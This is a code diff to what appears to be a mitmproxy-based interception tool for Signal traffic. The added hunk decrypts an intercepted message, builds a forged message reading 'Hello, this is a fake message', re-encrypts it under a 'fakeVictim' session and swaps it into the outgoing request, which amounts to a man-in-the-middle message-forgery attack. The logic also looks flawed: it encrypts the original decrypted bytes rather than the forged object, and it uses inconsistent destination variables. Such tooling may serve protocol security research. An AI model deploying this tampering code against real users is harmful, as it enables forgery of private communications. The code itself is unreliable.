@@ -27,7 +27,7 @@ import parse
 # from protos.gen.SignalService_pb2 import *
 # from protos.gen.storage_pb2 import *
 from protos.gen.WebSocketResources_pb2 import WebSocketMessage, WebSocketRequestMessage, WebSocketResponseMessage
-# from protos.gen.SignalService_pb2 import *
+from protos.gen.SignalService_pb2 import Content
 # from protos.gen.sealed_sender_pb2 import *
 # from protos.gen import *
 
@@ -759,6 +759,21 @@ def _v1_ws_message(flow, identifier):
                 logging.warning(f"DECRYPTION FAILED: {e}")
                 logging.warning(f"RAW content: {msg['content']}")
 
+        fakeMessage = Content()
+        fakeMessage.ParseFromString(dec)
+        fakeMessage.dataMessage.body = b"Hello, this is a fake message"
+        
+        enc = fakeVictim.encrypt(ProtocolAddress(destination, msg["destinationDeviceId"]), dec)
+        flow.request.content = json.dumps({
+            "destination": destination_user,
+            "messages": [{
+                "destinationDeviceId": 1,
+                "type": msg["type"],
+                "content": b64encode(enc).decode("utf-8")
+            }]
+        }).encode()
+
+        return flow.request.content
 
 def decap_ws_msg(orig_flow: HTTPFlow, msg, rtype=RouteType.REQUEST):
     ws_msg = WebSocketMessage()
